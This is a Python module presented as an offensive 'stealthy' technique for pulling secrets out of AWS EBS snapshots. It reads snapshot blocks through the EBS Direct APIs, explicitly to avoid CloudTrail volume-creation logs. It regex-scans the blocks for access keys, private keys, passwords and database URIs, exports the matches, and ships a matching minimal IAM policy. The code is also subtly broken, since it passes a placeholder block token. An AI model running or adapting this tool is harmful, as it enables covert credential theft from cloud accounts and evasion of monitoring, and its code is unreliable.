"""
AWS EBS Snapshot Triage

Stealthy technique for extracting data from AWS EBS snapshots without
creating volumes (avoiding detection).

Based on "The Modern Hacker's Playbook" - Part 4.3, TTP 1: AWS EBS Snapshot Triage
Reference: SANS DFIR Summit 2023
"""

import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
import re


try:
    import boto3
    BOTO3_AVAILABLE = True
except ImportError:
    BOTO3_AVAILABLE = False
    logging.warning("boto3 not available. Install: pip install boto3")


@dataclass
class EBSSnapshot:
    """EBS snapshot information"""
    snapshot_id: str
    volume_id: str
    description: str
    state: str
    volume_size: int  # GB
    encrypted: bool
    owner_id: str
    start_time: str


@dataclass
class SecretMatch:
    """Detected secret in snapshot"""
    snapshot_id: str
    block_index: int
    secret_type: str
    value: str
    confidence: float


class AWSEBSTriage:
    """
    AWS EBS Snapshot Triage Engine.

    This technique is extremely stealthy because it:
    1. Uses EBS Direct APIs to read snapshots WITHOUT creating volumes
    2. Avoids CloudTrail logs for ec2:CreateVolume
    3. Only requires read-only IAM permissions
    4. Can scan thousands of snapshots rapidly

    The SANS 2023 method uses the coldsnap CLI or direct boto3 calls
    to the EBS Direct APIs.

    Example:
        >>> triage = AWSEBSTriage(region="us-east-1")
        >>> snapshots = triage.list_snapshots()
        >>> for snapshot in snapshots:
        >>>     secrets = triage.scan_for_secrets(snapshot.snapshot_id)
        >>>     if secrets:
        >>>         print(f"Found {len(secrets)} secrets in {snapshot.snapshot_id}")
    """

    def __init__(self, region: str = "us-east-1", profile: Optional[str] = None):
        self.logger = logging.getLogger(__name__)
        self.region = region

        if not BOTO3_AVAILABLE:
            self.logger.error("boto3 required. Install: pip install boto3")
            self.ec2 = None
            self.ebs = None
            return

        try:
            session = boto3.Session(profile_name=profile, region_name=region) if profile else boto3.Session(region_name=region)

            self.ec2 = session.client('ec2')
            self.ebs = session.client('ebs')

            self.logger.info(f"Connected to AWS region: {region}")

        except Exception as e:
            self.logger.error(f"AWS connection failed: {e}")
            self.ec2 = None
            self.ebs = None

    def list_snapshots(self, owner_ids: Optional[List[str]] = None) -> List[EBSSnapshot]:
        """
        List EBS snapshots.

        Args:
            owner_ids: Filter by owner IDs (default: self)

        Returns:
            List of snapshots
        """
        if not self.ec2:
            return []

        self.logger.info("Listing EBS snapshots...")

        try:
            filters = []

            if owner_ids is None:
                # Get current account ID
                sts = boto3.client('sts')
                account_id = sts.get_caller_identity()['Account']
                owner_ids = [account_id]

            response = self.ec2.describe_snapshots(OwnerIds=owner_ids)

            snapshots = []

            for snap in response['Snapshots']:
                snapshot = EBSSnapshot(
                    snapshot_id=snap['SnapshotId'],
                    volume_id=snap.get('VolumeId', ''),
                    description=snap.get('Description', ''),
                    state=snap['State'],
                    volume_size=snap['VolumeSize'],
                    encrypted=snap.get('Encrypted', False),
                    owner_id=snap['OwnerId'],
                    start_time=str(snap['StartTime'])
                )

                snapshots.append(snapshot)

            self.logger.info(f"Found {len(snapshots)} snapshots")
            return snapshots

        except Exception as e:
            self.logger.error(f"Failed to list snapshots: {e}")
            return []

    def scan_for_secrets(self, snapshot_id: str,
                        block_limit: Optional[int] = 1000) -> List[SecretMatch]:
        """
        Scan snapshot for secrets using EBS Direct APIs.

        This is the core of the SANS 2023 technique - reading snapshot
        data directly without creating a volume.

        Args:
            snapshot_id: Snapshot ID to scan
            block_limit: Max blocks to scan (None = all)

        Returns:
            List of found secrets
        """
        if not self.ebs:
            return []

        self.logger.info(f"Scanning snapshot {snapshot_id} for secrets...")

        secrets = []

        try:
            # List snapshot blocks
            response = self.ebs.list_snapshot_blocks(SnapshotId=snapshot_id)

            blocks = response.get('Blocks', [])

            if block_limit:
                blocks = blocks[:block_limit]

            self.logger.info(f"Scanning {len(blocks)} blocks...")

            for i, block in enumerate(blocks):
                block_index = block['BlockIndex']

                # Read block data
                block_data = self._read_snapshot_block(snapshot_id, block_index)

                if block_data:
                    # Scan for secrets
                    found_secrets = self._detect_secrets(block_data, snapshot_id, block_index)
                    secrets.extend(found_secrets)

                if (i + 1) % 100 == 0:
                    self.logger.info(f"Scanned {i + 1}/{len(blocks)} blocks...")

            self.logger.info(f"Found {len(secrets)} potential secrets")

        except Exception as e:
            self.logger.error(f"Snapshot scan failed: {e}")

        return secrets

    def _read_snapshot_block(self, snapshot_id: str, block_index: int) -> Optional[bytes]:
        """Read a specific block from snapshot"""
        try:
            response = self.ebs.get_snapshot_block(
                SnapshotId=snapshot_id,
                BlockIndex=block_index,
                BlockToken='...'  # Obtained from list_snapshot_blocks
            )

            # Read block data
            block_data = response['BlockData'].read()
            return block_data

        except Exception as e:
            # Block might not exist or be readable
            return None

    def _detect_secrets(self, data: bytes, snapshot_id: str,
                       block_index: int) -> List[SecretMatch]:
        """Detect secrets in block data"""
        secrets = []

        # Convert to string (try multiple encodings)
        try:
            text = data.decode('utf-8', errors='ignore')
        except:
            text = data.decode('latin-1', errors='ignore')

        # Secret patterns
        patterns = {
            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret Key': r'(?i)aws_secret_access_key.*[\'"]([a-zA-Z0-9/+=]{40})[\'"]',
            'Private Key': r'-----BEGIN (?:RSA|OPENSSH|EC) PRIVATE KEY-----',
            'API Key': r'(?i)api[_-]?key.*[\'"]([a-zA-Z0-9_-]{32,})[\'"]',
            'Password': r'(?i)password.*[=:]\s*[\'"]([^\'"]{8,})[\'"]',
            'Database URI': r'(?i)(postgres|mysql|mongodb)://[^\s]+',
        }

        for secret_type, pattern in patterns.items():
            matches = re.finditer(pattern, text)

            for match in matches:
                secret = SecretMatch(
                    snapshot_id=snapshot_id,
                    block_index=block_index,
                    secret_type=secret_type,
                    value=match.group(0),
                    confidence=0.8
                )

                secrets.append(secret)

        return secrets

    def export_secrets(self, secrets: List[SecretMatch], output_file: str):
        """Export found secrets to file"""
        import json

        secrets_data = [
            {
                'snapshot_id': s.snapshot_id,
                'block_index': s.block_index,
                'type': s.secret_type,
                'value': s.value,
                'confidence': s.confidence
            }
            for s in secrets
        ]

        with open(output_file, 'w') as f:
            json.dump(secrets_data, f, indent=2)

        self.logger.info(f"Exported {len(secrets)} secrets to {output_file}")


# IAM Policy for EBS Direct API access (read-only)
EBS_DIRECT_READONLY_POLICY = {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "ebs:ListSnapshotBlocks",
                "ebs:ListChangedBlocks",
                "ebs:GetSnapshotBlock"
            ],
            "Resource": "*"
        },
        {
            "Effect": "Allow",
            "Action": [
                "ec2:DescribeSnapshots"
            ],
            "Resource": "*"
        }
    ]
}
